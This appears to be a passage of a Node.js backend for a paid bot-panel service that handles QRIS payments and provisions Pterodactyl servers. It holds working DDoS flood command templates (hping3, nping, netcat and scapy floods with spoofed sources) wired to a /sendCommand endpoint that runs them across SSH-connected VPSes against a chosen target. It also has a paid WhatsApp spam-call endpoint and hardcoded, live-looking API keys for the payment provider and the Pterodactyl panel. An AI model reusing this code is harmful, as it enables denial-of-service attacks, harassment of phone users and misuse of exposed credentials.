        const response = await axios.post(`${PAYMENT_PROVIDER_URL}/status`, {
            api_key: providerApiKey(),
            reff_id: reffId
        }, { timeout: 15000, validateStatus: status => status >= 200 && status < 300 });
        const providerData = response.data;
        const providerStatus = providerData?.data?.status;
        const index = transactions.findIndex(item => item.reff_id === reffId);
        if (index !== -1 && providerStatus) {
            transactions[index].status = providerStatus;
            transactions[index].updated_at = new Date().toISOString();
            fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));
        }
        return res.json({ ...providerData, author: 'KAZE X' });
    } catch (
        error) {
        console.error('[QRIS STATUS]', error.response?.status || error.code || error.message);
        return res.status(502).json({ success: false, message: 'Payment provider tidak dapat dihubungi' });
    }
};

app.post('/api/qris-order-status', qrisOrderStatusHandler);
app.get('/api/qris-order-status', qrisOrderStatusHandler);

app.post('/api/list-all-transaksi', async (req, res) => {
    const input = { ...(req.query || {}), ...(req.body || {}) };
    const owner = getPaymentKeyOwner(input.api_key || input.key);
    if (!owner) return res.status(401).json({ success: false, message: 'API key user tidak valid' });
    if (!providerApiKey()) {
        return res.status(503).json({ success: false, message: 'Payment provider belum dikonfigurasi' });
    }

    const page = Math.max(1, Number.parseInt(input.page, 10) || 1);
    const perPage = Math.min(100, Math.max(1, Number.parseInt(input.per_page, 10) || 15));
    const payload = {
        api_key: providerApiKey(),
        page,
        per_page: perPage,
        ...(typeof input.status === 'string' && input.status.trim() ? { status: input.status.trim() } : {}),
        ...(typeof input.code === 'string' && input.code.trim() ? { code: input.code.trim() } : {})
    };

    try {
        const response = await axios.post(`${PAYMENT_PROVIDER_URL}/list`, payload, {
            timeout: 15000,
            validateStatus: status => status >= 200 && status < 300
        });
        const localTransactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE, 'utf8'))
            .filter(item => transactionOwnerMatches(item, owner.username));
        const providerData = response.data;
        const providerItems = Array.isArray(providerData?.data) ? providerData.data : [];
        const ownedRefs = new Set(localTransactions.map(item => item.reff_id));
        const ownedItems = providerItems.filter(item => ownedRefs.has(item?.reff_id));
        return res.json({ ...providerData, data: ownedItems, author: 'KAZE X' });
    } catch (error) {
        console.error('[LIST TRANSACTIONS]', error.response?.status || error.code || error.message);
        return res.status(502).json({ success: false, message: 'Payment provider tidak dapat dihubungi' });
    }
});

const PANELS_FILE = path.join(__dirname, 'panels.json');
if (!fs.existsSync(PANELS_FILE)) {
    fs.writeFileSync(PANELS_FILE, JSON.stringify([], null, 2));
}

app.post("/store/create-qris", async (req, res) => {
    try {
        const { username, panel_username, amount } = req.body;
        if (!username || !panel_username || !amount) {
            return res.status(400).json({ success: false, message: "Username, Panel Username, dan Amount diperlukan" });
        }

        // Cek kapasitas panel dulu
        try {
            getAvailablePanel();
        } catch (panelErr) {
            return res.status(400).json({ success: false, message: "Maaf, panel sudah penuh dan belum menambah VPS lagi" });
        }

        const orderId = `MANTA_${username.toUpperCase()}_${Date.now().toString().slice(-6)}`;
        const apiKey = "z2I3OYk7dHx32QfDMwvUnrub9qd1NvfJ";

        // Buat password acak untuk Pterodactyl
        const randomStr = Math.random().toString(36).substring(2, 8);
        const panel_password = `Manta-${randomStr}!`;


        const response = await axios.post("https://app.pakasir.com/api/transactioncreate/qris", {
            project: "panelss",
            order_id: orderId,
            amount: parseInt(amount),
            api_key: apiKey
        });

        if (response.data && response.data.payment) {
            const paymentData = response.data.payment;
            // Simpan ke database transaksi
            let transactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE));
            transactions.push({
                username,
                panel_username,
                panel_password,
                order_id: paymentData.order_id,
                original_order_id: orderId,
                amount: paymentData.amount,
                total_payment: paymentData.total_payment,
                payment_number: paymentData.payment_number, // Ini adalah QR String
                expired_at: paymentData.expired_at,
                status: "pending",
                created_at: new Date().toISOString()
            });
            fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));

            return res.json({ success: true, payment: paymentData });
        } else {
            return res.status(500).json({ success: false, message: "Gagal mendapatkan QR dari PakAsir", data: response.data });
        }
    } catch (e) {
        console.error(chalk.red("[QRIS ERROR]"), e?.response?.data || e.message);
        return res.status(500).json({ success: false, message: "Terjadi kesalahan sistem", error: e.message });
    }
});

app.get("/store/history", (req, res) => {
    try {
        const { username } = req.query;
        if (!username) return res.status(400).json({ success: false, message: "Username diperlukan" });

        let transactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE));
        const cleanUsername = username.trim().toLowerCase();

        let relatedUsernames = new Set([cleanUsername]);
        try {
            const db = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
            const currentUser = db.find(u => u.username && u.username.trim().toLowerCase() === cleanUsername);
            if (currentUser && currentUser.telegramId) {
                const tid = currentUser.telegramId;
                for (const u of db) {
                    if (u.telegramId === tid && u.username) {
                        relatedUsernames.add(u.username.trim().toLowerCase());
                    }
                }
            }
            if (currentUser && currentUser.username) {
                relatedUsernames.add(currentUser.username.trim().toLowerCase());
            }
        } catch (_) { }

        let userHistory = transactions.filter(t => {
            const txUser = (t.username || '').trim().toLowerCase();
            const txPanelUser = (t.panel_username || '').trim().toLowerCase();
            if (relatedUsernames.has(txUser)) return true;
            if (relatedUsernames.has(txPanelUser)) return true;
            if (txUser.includes(cleanUsername) || cleanUsername.includes(txUser)) return true;
            return false;
        });

        userHistory = userHistory.map(t => {
            const panel = getPanelById(t.panel_id);
            return {
                ...t,
                panel_domain: panel.domain
            };
        });

        return res.json({ success: true, history: userHistory.reverse() });
    } catch (e) {
        return res.status(500).json({ success: false, message: "Error reading history" });
    }
});

// Legacy defaults (hanya untuk backward compatibility transaksi lama yang belum ada panel_id)
const DEFAULT_PT_URL = "https://panel.otax.fun";
const DEFAULT_PTLA_KEY = "ptla_3DTcGe6tyEnBnDuAwrwXf8xn3VQrIrhEgortRMeNWrh";
const DEFAULT_PTLC_KEY = "ptlc_DCNabtFjKgU0H1WlmTU3TuYOKFehYzmVjMcxenl0Xhj";

// [OPTIMASI] Cache panels.json di memori agar tidak baca disk setiap request
let _panelsCache = null;
let _panelsCacheTime = 0;
const PANELS_CACHE_TTL = 5000; // 5 detik
function loadPanelsCached() {
    const now = Date.now();
    if (!_panelsCache || (now - _panelsCacheTime) > PANELS_CACHE_TTL) {
        try { _panelsCache = JSON.parse(fs.readFileSync(PANELS_FILE)); } catch { _panelsCache = []; }
        _panelsCacheTime = now;
    }
    return _panelsCache;
}
function invalidatePanelsCache() { _panelsCache = null; }

function getAvailablePanel() {
    let panels = loadPanelsCached();
    const availablePanel = panels.find(p => p.usage < p.limit);
    if (!availablePanel) {
        throw new Error("Semua server panel sedang penuh! Mohon tunggu owner menambah slot.");
    }
    return availablePanel;
}

function getPanelById(panelId) {
    if (!panelId) return { domain: DEFAULT_PT_URL, ptla: DEFAULT_PTLA_KEY, ptlc: DEFAULT_PTLC_KEY };
    let panels = loadPanelsCached();
    const panel = panels.find(p => p.id === panelId);
    if (!panel) return { domain: DEFAULT_PT_URL, ptla: DEFAULT_PTLA_KEY, ptlc: DEFAULT_PTLC_KEY };
    return panel;
}

function incrementPanelUsage(panelId) {
    let panels = JSON.parse(fs.readFileSync(PANELS_FILE));
    let panelIndex = panels.findIndex(p => p.id === panelId);
    if (panelIndex !== -1) {
        panels[panelIndex].usage += 1;
        fs.writeFileSync(PANELS_FILE, JSON.stringify(panels, null, 2));
        invalidatePanelsCache(); // Invalidasi cache setelah write
    }
}

async function createPterodactylServer(username, password, panelConfig) {
    const { domain, ptla } = panelConfig;
    try {
        let userId;
        try {
            const userRes = await axios.post(`${domain}/api/application/users`, {
                email: `${username}@manta.app`,
                username: username,
                first_name: "Manta",
                last_name: username,
                password: password
            }, { headers: { Authorization: `Bearer ${ptla}`, "Content-Type": "application/json" } });
            const uData = userRes.data.attributes ? userRes.data : userRes.data.data;
            userId = uData.attributes.id;
        } catch (err) {
            const usersRes = await axios.get(`${domain}/api/application/users?filter[username]=${username}`, {
                headers: { Authorization: `Bearer ${ptla}` }
            });
            if (usersRes.data.data.length > 0) {
                const existingUser = usersRes.data.data[0].attributes;
                userId = existingUser.id;
                // Update password user yang sudah ada agar sesuai dengan password baru di APK
                await axios.patch(`${domain}/api/application/users/${userId}`, {
                    email: existingUser.email,
                    username: existingUser.username,
                    first_name: existingUser.first_name,
                    last_name: existingUser.last_name,
                    password: password
                }, { headers: { Authorization: `Bearer ${ptla}`, "Content-Type": "application/json" } });
            } else {
                throw new Error("Gagal membuat/mencari user Pterodactyl");
            }
        }

        const serverRes = await axios.post(`${domain}/api/application/servers`, {
            name: `${username}_manta_bot`,
            user: userId,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_24",
            startup: "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z ${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=$(echo ${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\\n\");      for line in $vars;     do export $line;     done fi;  /usr/local/bin/${CMD_RUN};",
            environment: {
                GIT_ADDRESS: "",
                BRANCH: "",
                USERNAME: "",
                ACCESS_TOKEN: "",
                CMD_RUN: "npm start"
            },
            limits: {
                memory: 2048,
                swap: 0,
                disk: 5120,
                io: 500,
                cpu: 100
            },
            feature_limits: {
                databases: 0,
                backups: 0,
                allocations: 1
            },
            deploy: {
                locations: [1],
                dedicated_ip: false,
                port_range: []
            }
        }, { headers: { Authorization: `Bearer ${ptla}`, "Content-Type": "application/json" } });

        const sData = serverRes.data.attributes ? serverRes.data : serverRes.data.data;
        return {
            server_id: sData.attributes.id,
            server_uuid: sData.attributes.identifier
        };
    } catch (e) {
        console.error("Pterodactyl Create Server Error:", e.response ? e.response.data : e.message);
        throw e;
    }
}

app.post("/store/simulate-payment", async (req, res) => {
    try {
        const { order_id } = req.body;
        let transactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE));
        let foundTx = transactions.find(t => t.order_id === order_id || t.original_order_id === order_id);

        if (!foundTx) {
            return res.status(404).json({ success: false, message: "Order tidak ditemukan" });
        }

        if (foundTx.status !== "completed") {
            try {
                // Buat server di pterodactyl dengan load balancing
                const panel = getAvailablePanel();
                const serverData = await createPterodactylServer(foundTx.panel_username, foundTx.panel_password, panel);
                foundTx.server_id = serverData.server_id;
                foundTx.server_uuid = serverData.server_uuid;
                foundTx.panel_id = panel.id; // Simpan id panel yang digunakan
                foundTx.status = "completed";
                foundTx.completed_at = new Date().toISOString();

                incrementPanelUsage(panel.id);
                fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));
                return res.json({ success: true, message: "Simulasi pembayaran & create server berhasil" });
            } catch (err) {
                return res.status(500).json({ success: false, message: "Gagal membuat server panel: " + err.message });
            }
        } else {
            return res.json({ success: true, message: "Sudah completed sebelumnya" });
        }
    } catch (e) {
        return res.status(500).json({ success: false, message: "Terjadi kesalahan sistem" });
    }
});

function findTxByUsername(transactions, username) {
    if (!username) return null;
    const clean = username.trim().toLowerCase();
    let found = transactions.find(t => (t.username || '').trim().toLowerCase() === clean && t.status === "completed" && t.server_uuid);
    if (found) return found;
    found = transactions.find(t => (t.panel_username || '').trim().toLowerCase() === clean && t.status === "completed" && t.server_uuid);
    if (found) return found;
    try {
        const db = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
        const currentUser = db.find(u => u.username && u.username.trim().toLowerCase() === clean);
        if (currentUser && currentUser.telegramId) {
            const related = db.filter(u => u.telegramId === currentUser.telegramId && u.username);
            for (const r of related) {
                const rUser = r.username.trim().toLowerCase();
                found = transactions.find(t => (t.username || '').trim().toLowerCase() === rUser && t.status === "completed" && t.server_uuid);
                if (found) return found;
            }
        }
    } catch (_) { }
    found = transactions.find(t => {
        const txUser = (t.username || '').trim().toLowerCase();
        return txUser.includes(clean) || clean.includes(txUser);
    });
    if (found && found.status === "completed" && found.server_uuid) return found;
    return null;
}

app.post("/store/server/power", async (req, res) => {
    try {
        const { username, signal } = req.body;
        let transactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE));
        let foundTx = findTxByUsername(transactions, username);

        if (!foundTx) {
            return res.status(404).json({ success: false, message: "Server tidak ditemukan atau belum aktif" });
        }

        const panel = getPanelById(foundTx.panel_id);

        await axios.post(`${panel.domain}/api/client/servers/${foundTx.server_uuid}/power`, {
            signal: signal
        }, {
            headers: {
                Authorization: `Bearer ${panel.ptlc}`,
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
        });

        return res.json({ success: true, message: `Berhasil mengirim sinyal ${signal}` });
    } catch (e) {
        console.error("Power Error:", e.response ? e.response.data : e.message);
        return res.status(500).json({ success: false, message: "Gagal mengirim sinyal power" });
    }
});

const FormData = require('form-data');
app.post("/store/server/install", async (req, res) => {
    try {
        const { username, bot_token, owner_id, telegram_username } = req.body;
        let transactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE));
        let foundTx = findTxByUsername(transactions, username);

        if (!foundTx) {
            return res.status(404).json({ success: false, message: "Server tidak ditemukan" });
        }

        const panel = getPanelById(foundTx.panel_id);
        const uuid = foundTx.server_uuid;

        const uploadUrlRes = await axios.get(`${panel.domain}/api/client/servers/${uuid}/files/upload`, {
            headers: { Authorization: `Bearer ${panel.ptlc}` }
        });
        const uploadUrl = uploadUrlRes.data.attributes.url;

        const zipPath = path.join(__dirname, 'bot.zip');
        if (!fs.existsSync(zipPath)) {
            return res.status(500).json({ success: false, message: "File SC (bot.zip) tidak ditemukan di server API" });
        }
        const form = new FormData();
        form.append('files', fs.createReadStream(zipPath));

        await axios.post(uploadUrl, form, {
            headers: {
                ...form.getHeaders()
            }
        });

        await axios.post(`${panel.domain}/api/client/servers/${uuid}/files/decompress`, {
            root: "/",
            file: "bot.zip"
        }, { headers: { Authorization: `Bearer ${panel.ptlc}`, "Content-Type": "application/json" } });

        const configJsContent = `module.exports = {
  BOT_TOKEN: "${bot_token}",
  OWNER_ID: ["${owner_id}"],
  OWN: "${telegram_username}",
};
`;
        await axios.post(`${panel.domain}/api/client/servers/${uuid}/files/write?file=/config.js`, configJsContent, {
            headers: { Authorization: `Bearer ${panel.ptlc}`, "Content-Type": "text/plain" }
        });

        await axios.post(`${panel.domain}/api/client/servers/${uuid}/power`, { signal: "start" }, {
            headers: { Authorization: `Bearer ${panel.ptlc}`, "Content-Type": "application/json" }
        });

        return res.json({ success: true, message: "1-Click Install selesai! Server sedang menyala." });
    } catch (e) {
        console.error("Install Error:", e.response ? e.response.data : e.message);
        return res.status(500).json({ success: false, message: "Gagal menginstal SC: " + e.message });
    }
});

app.get("/store/server/websocket-token", async (req, res) => {
    try {
        const { username } = req.query;
        let transactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE));
        let foundTx = findTxByUsername(transactions, username);

        if (!foundTx) {
            return res.status(404).json({ success: false, message: "Server tidak ditemukan" });
        }

        const uuid = foundTx.server_uuid;
        const panel = getPanelById(foundTx.panel_id);
        const wsRes = await axios.get(`${panel.domain}/api/client/servers/${uuid}/websocket`, {
            headers: { Authorization: `Bearer ${panel.ptlc}` }
        });

        return res.json({ success: true, data: wsRes.data.data });
    } catch (e) {
        console.error("WS Token Error:", e.response ? e.response.data : e.message);
        const errMsg = e.response && e.response.data ? JSON.stringify(e.response.data) : e.message;
        return res.status(500).json({ success: false, message: errMsg });
    }
});

app.get("/webhook/pakasir", (req, res) => { res.status(200).send("Webhook Manta Bot Aktif & Siap Menerima POST dari Pakasir!"); });

app.post("/webhook/pakasir", async (req, res) => {
    try {
        console.log(chalk.green("\n[PAKASIR WEBHOOK] === DITERIMA PAYLOAD BARU ==="));
        const body = req.body || {};
        console.log(chalk.blue("BODY:"), JSON.stringify(body, null, 2));

        const order_id = body.order_id || body.reference_id || body.reference;
        const status = (body.status || body.transaction_status || "").toString().toLowerCase();

        if (order_id && (status === 'success' || status === 'paid' || status === 'settlement' || status === 'berhasil' || status === 'completed')) {
            let transactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE));
            // Cari berdasarkan order_id dari Pakasir ATAU original_order_id (merchant order ID)
            let foundTx = transactions.find(t => t.order_id === order_id || t.original_order_id === order_id);

            if (foundTx && foundTx.status !== "completed") {
                try {
                    console.log(chalk.yellow(`[WEBHOOK] Memproses pembuatan panel untuk ${foundTx.panel_username}...`));
                    const panel = getAvailablePanel();
                    const serverData = await createPterodactylServer(foundTx.panel_username, foundTx.panel_password, panel);

                    // RE-READ TRANSACTIONS UNTUK MENCEGAH DATA HILANG JIKA ADA ORDER LAIN BERSAMAAN
                    let latestTransactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE));
                    let txToUpdate = latestTransactions.find(t => t.order_id === foundTx.order_id || t.original_order_id === foundTx.original_order_id);

                    if (txToUpdate) {
                        txToUpdate.server_id = serverData.server_id;
                        txToUpdate.server_uuid = serverData.server_uuid;
                        txToUpdate.panel_id = panel.id;
                        txToUpdate.status = "completed";
                        txToUpdate.completed_at = new Date().toISOString();

                        incrementPanelUsage(panel.id);
                        fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(latestTransactions, null, 2));
                        console.log(chalk.green(`[WEBHOOK] Order ${order_id} LUNAS! Panel berhasil dibuat di ${panel.domain}.`));
                    }
                } catch (err) {
                    console.error(chalk.red("[WEBHOOK ERROR] Gagal membuat server Pterodactyl: " + err.message));
                }
            } else if (foundTx && foundTx.status === "completed") {
                console.log(chalk.blue(`[WEBHOOK] Order ${order_id} sudah diproses sebelumnya.`));
            } else {
                console.log(chalk.red(`[WEBHOOK] Order ${order_id} tidak ditemukan di database.`));
            }
        } else {
            console.log(chalk.yellow(`[WEBHOOK] Status bukan sukses/lunas (status: ${status}) atau order_id kosong.`));
        }

        return res.status(200).send("OK");
    } catch (e) {
        console.error(chalk.red("[PAKASIR ERROR]"), e);
        return res.status(500).send("ERROR");
    }
});

// Agar Pakasir yang mengirim ke "/" tetap diterima sebagai webhook
app.post("/", (req, res) => {
    req.url = "/webhook/pakasir";
    req.app.handle(req, res);
});

function buildAttackCmd(method, target, port, duration) {
    switch (method) {
        case "udp_hping3":   // DEFAULT — hping3 UDP flood
            return `hping3 --udp --flood --rand-source -p ${port} -d 1400 ${target}`;

        case "udp_nping":    // nping (dari paket nmap)
            return `nping --udp -p ${port} --rate 50000 --data-length 1400 --dest-ip ${target} -c 9999999`;

        case "udp_bash":     // Pure bash + /dev/urandom, tidak butuh tool tambahan
            return `bash -c 'while true; do dd if=/dev/urandom bs=1400 count=1 2>/dev/null | nc -u -w0 ${target} ${port}; done'`;

        case "udp_scapy":    // Python scapy — spoof random source IP
            return `python3 -c "
import random,time
from scapy.all import *
end=time.time()+${duration}
while time.time()<end:
  src='.'.join(str(random.randint(1,254)) for _ in range(4))
  send(IP(src=src,dst='${target}')/UDP(dport=${port})/Raw(b'A'*1400),verbose=0)
"`;

        case "udp_multi":    // hping3 di 4 thread paralel via GNU parallel
            return `seq 4 | parallel -j 4 "hping3 --udp --flood --rand-source -p ${port} -d 1400 ${target}"`;



        case "tcp_syn":      // TCP SYN flood
            return `hping3 -S --flood --rand-source -p ${port} -d 1400 ${target}`;

        case "tcp_ack":      // TCP ACK flood (bypass beberapa stateless firewall)
            return `hping3 -A --flood --rand-source -p ${port} ${target}`;

        case "tcp_rst":      // TCP RST — putus koneksi aktif
            return `hping3 -R --flood --rand-source -p ${port} ${target}`;

        case "tcp_fin":      // TCP FIN flood
            return `hping3 -F --flood --rand-source -p ${port} ${target}`;



        case "icmp_flood":   // ICMP ping flood
            return `hping3 --icmp --flood --rand-source ${target}`;


        default:
            return `hping3 --udp --flood --rand-source -p ${port} -d 1400 ${target}`;
    }
}


app.post("/sendCommand", async (req, res) => {
    return res.status(410).json({ error: "Endpoint disabled" });
    const { key, target, port, duration, method = "udp_hping3" } = req.body;

    const owner = await getUserByKey(key, req);
    if (!owner) return res.status(401).json({ error: "Invalid session key" });
    if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

    const userVPS = vpsList.filter(vps => vps.owner === owner);
    if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available" });

    const sessionName = `otax_${Date.now()}`;
    let sent = 0;

    for (const vps of userVPS) {
        const conn = vpsConnections[vps.host];
        if (!conn) { console.log(`Not connected: ${vps.host}`); continue; }


        const attackCmd = buildAttackCmd(method, target, port, duration);
        const startCmd = `screen -dmS ${sessionName} bash -c '${attackCmd}'`;
        const stopCmd = `(sleep ${duration} && screen -S ${sessionName} -X quit 2>/dev/null) &`;
        const fullCmd = `${startCmd}; ${stopCmd}`;

        conn.exec(fullCmd, (err, stream) => {
            if (err) { console.error(`${vps.host}: ${err.message}`); return; }
            stream.on("close", code => console.log(`${vps.host} done (${code})`));
            stream.stderr.on("data", d => console.error(`STDERR ${vps.host}: ${d}`));
        });

        sent++;
    }

    if (sent === 0) return res.status(500).json({ error: "Semua VPS gagal dieksekusi" });

    console.log(`[${method}] Attack: ${target}:${port} via ${sent} VPS, durasi ${duration}s`);


    res.json({
        success: true,
        message: `Attack dikirim ke ${sent} VPS`,
        target,
        port,
        duration,
        vps_count: sent,
    });
});




// Moved DB_CACHE_TTL and _dbCacheTime to top

function loadDatabase() {
    const now = Date.now();
    if (!_dbCache || (now - _dbCacheTime) > DB_CACHE_TTL) {
        try {
            if (!fs.existsSync(DB_PATH)) fs.writeFileSync(DB_PATH, JSON.stringify([]));
            _dbCache = JSON.parse(fs.readFileSync(DB_PATH));
        } catch {
            _dbCache = [];
        }
        _dbCacheTime = now;
    }
    return _dbCache;
}

function loadDatabaseFresh() {
    _dbCache = null;
    return loadDatabase();
}

function saveDatabase(data) {
    try {
        const tmpPath = DB_PATH + '.tmp_' + Date.now();
        fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2));
        fs.renameSync(tmpPath, DB_PATH);
        _dbCache = data;
        _dbCacheTime = Date.now();
    } catch (e) {
        console.error('[saveDatabase]', e.message);
        try { fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2)); } catch { }
        _dbCache = data;
        _dbCacheTime = Date.now();
    }
}

function normalizeRole(role) {
    return String(role || "member").trim().toLowerCase();
}

function normalizeRoleKey(role) {
    const raw = String(role || "member").trim().toUpperCase();
    if (raw === "MEMBER") return "member";
    return raw || "member";
}

function isMemberRole(role) {
    return normalizeRole(role) === "member";
}

const WIB_OFFSET_MS = 7 * 60 * 60 * 1000;

function pad2(n) {
    return String(n).padStart(2, "0");
}

function wibDateParts(ms = Date.now()) {
    const d = new Date(ms + WIB_OFFSET_MS);
    return {
        year: d.getUTCFullYear(),
        month: d.getUTCMonth(),
        date: d.getUTCDate(),
        hour: d.getUTCHours(),
        minute: d.getUTCMinutes(),
        second: d.getUTCSeconds(),
        ms: d.getUTCMilliseconds()
    };
}

function wibPartsToUtcMs(parts) {
    return Date.UTC(
        parts.year,
        parts.month,
        parts.date,
        parts.hour || 0,
        parts.minute || 0,
        parts.second || 0,
        parts.ms || 0
    ) - WIB_OFFSET_MS;
}

function endOfWibDayMs(year, month, date) {
    return wibPartsToUtcMs({ year, month, date, hour: 23, minute: 59, second: 59, ms: 999 });
}

function createExpiryIsoWib(days) {
    let addDays = Number(days);
    if (!Number.isFinite(addDays) || addDays <= 0) return null;
    if (addDays > 36500) addDays = 36500;
    const now = wibDateParts();
    try {
        const expiryDate = new Date(endOfWibDayMs(now.year, now.month, now.date + addDays));
        if (isNaN(expiryDate.getTime())) {
            return new Date(Date.now() + (Math.min(addDays, 36500) * 86400000)).toISOString();
        }
        return expiryDate.toISOString();
    } catch (e) {
        return new Date(Date.now() + (Math.min(addDays, 36500) * 86400000)).toISOString();
    }
}

function addDaysToExpiryIsoWib(expiredDate, addDays) {
    let add = Number(addDays);
    if (!Number.isFinite(add) || add <= 0) return null;
    if (add > 36500) add = 36500;
    const baseMs = parseUserExpiredMs(expiredDate);
    const base = wibDateParts(Number.isFinite(baseMs) ? Math.max(baseMs, Date.now()) : Date.now());
    try {
        const result = new Date(endOfWibDayMs(base.year, base.month, base.date + add));
        if (isNaN(result.getTime())) return new Date(Date.now() + (add * 86400000)).toISOString();
        return result.toISOString();
    } catch (e) {
        return new Date(Date.now() + (add * 86400000)).toISOString();
    }
}

function parseUserExpiredMs(value) {
    if (!value) return NaN;
    if (value instanceof Date) return value.getTime();
    if (typeof value === "number") return value;

    const raw = String(value).trim();
    if (!raw) return NaN;

    let m = raw.match(/^(\d{4})-(\d{1,2})-(\d{1,2})(?:[, T]+(\d{1,2})(?:[:.](\d{1,2}))?(?:[:.](\d{1,2}))?)?$/);
    if (m) {
        const [, y, mo, d, h, mi, s] = m;
        if (h == null) return endOfWibDayMs(Number(y), Number(mo) - 1, Number(d));
        return wibPartsToUtcMs({
            year: Number(y),
            month: Number(mo) - 1,
            date: Number(d),
            hour: Number(h),
            minute: Number(mi || 0),
            second: Number(s || 0)
        });
    }

    m = raw.match(/^(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})(?:[, T]+(\d{1,2})(?:[:.](\d{1,2}))?(?:[:.](\d{1,2}))?)?$/);
    if (m) {
        const [, d, mo, y, h, mi, s] = m;
        if (h == null) return endOfWibDayMs(Number(y), Number(mo) - 1, Number(d));
        return wibPartsToUtcMs({
            year: Number(y),
            month: Number(mo) - 1,
            date: Number(d),
            hour: Number(h),
            minute: Number(mi || 0),
            second: Number(s || 0)
        });
    }

    const parsed = Date.parse(raw);
    if (!Number.isNaN(parsed)) return parsed;

    return NaN;
}

function formatWibMs(ms) {
    if (!Number.isFinite(ms)) return "-";
    const p = wibDateParts(ms);
    return `${pad2(p.date)}/${pad2(p.month + 1)}/${p.year} ${pad2(p.hour)}:${pad2(p.minute)}:${pad2(p.second)} WIB`;
}

function cleanupUserArtifacts(username) {
    if (!username) return

    try {
        const keyList = loadKeyList()
        const cleanedKeyList = keyList.filter(e => e.username !== username)
        saveKeyList(cleanedKeyList)
    } catch { }

    for (const k in activeKeys) {
        if (activeKeys[k]?.username === username) {
            delete activeKeys[k]
        }
    }
}

function removeUserFromDatabase(db, index) {
    if (!Array.isArray(db) || index < 0 || index >= db.length) return null

    const removed = db[index]
    db.splice(index, 1)
    cleanupUserArtifacts(removed?.username)
    return removed
}

function generateKey() {
    return crypto.randomBytes(8).toString("hex")
}

function createOrReplaceKey(username, expiredDate, role = "USER") {
    const db = loadDatabase()

    for (const k in db) {
        if (db[k].username === username) delete db[k]
    }

    let key
    do {
        key = generateKey()
    } while (db[key])

    db[key] = {
        username,
        expiredDate,
        role,
        createdAt: Date.now()
    }

    saveDatabase(db)
    return key
}

async function getUserObjectByKey(key) {
    if (!key) return null;
    reloadActiveKeys();
    let keyInfo = activeKeys[key];

    if (!keyInfo) {
        await new Promise(r => setTimeout(r, 350));
        reloadActiveKeys();
        keyInfo = activeKeys[key];
    }

    if (!keyInfo) return null;
    const db = loadDatabase();
    return db.find(u => u.username.trim().toLowerCase() === keyInfo.username.trim().toLowerCase()) || null;
}

function getKeyByUsername(username) {
    const db = loadDatabase()
    for (const k in db) {
        if (db[k].username === username) {
            return { key: k, ...db[k] }
        }
    }
    return null
}

function isExpired(user) {
    if (!user || !user.expiredDate) return false;
    const exp = parseUserExpiredMs(user.expiredDate);
    if (isNaN(exp)) return false;
    return exp <= Date.now();
}

function formatDateExp(dateStr) {
    try {
        const parsed = parseUserExpiredMs(dateStr);
        const d = Number.isFinite(parsed) ? new Date(parsed) : new Date(dateStr);
        return d.toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }).replace(/\./g, ":");
    } catch {
        return dateStr;
    }
}

async function validateKey(key) {
    const user = await getUserObjectByKey(key)
    if (!user) return { valid: false }

    if (isExpired(user)) {
        return { valid: false, expired: true }
    }

    return { valid: true, user }
}
const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

const THIRD_PARTY_API_KEY = "jere_7N9GY-uL1YbM";
const THIRD_PARTY_URL = "https://api.jerexd.my.id/api/sysinfo";

app.get("/api/maker/fakelobbyff", async (req, res) => {
  try {
    const { nickname } = req.query;

    if (!nickname) {
      return res.status(400).json({
        status: false,
        message: "Parameter nickname wajib diisi"
      });
    }

    const response = await axios.get(THIRD_PARTY_URL, {
      params: {
        apikey: THIRD_PARTY_API_KEY
      },
      timeout: 15000
    });

    return res.json({
      status: true,
      nickname,
      result: response.data
    });

  } catch (error) {
    console.error("FakeLobbyFF Error:", error.message);

    return res.status(500).json({
      status: false,
      message: "Gagal memproses request"
    });
  }
});

app.get("/spamCall", async (req, res) => {
    const { key, target, qty } = req.query;

    const username = await getUserByKey(key, req);
    if (!username) return res.json({ valid: false });

    const db = loadDatabase();
    const user = db.find(u => u.username && u.username.trim().toLowerCase() === username.trim().toLowerCase());
    if (blockReview(user, res)) return;
    const role = normalizeRoleKey(user?.role);
    if (!user || !["FULLUP", "RESELLER", "PT", "TK", "OWNER", "KINGZ"].includes(role)) {
        return res.json({ valid: false, message: "Access denied" });
    }

    const maxQty = role === "KINGZ" ? 10 : 5;
    const callQty = parseInt(qty) || 1;

    if (callQty > maxQty) {
        return res.json({
            valid: false,
            message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
        });
    }

    const bizKeys = Object.keys(activeConnections);
    if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

    const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

    const now = Date.now();
    const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

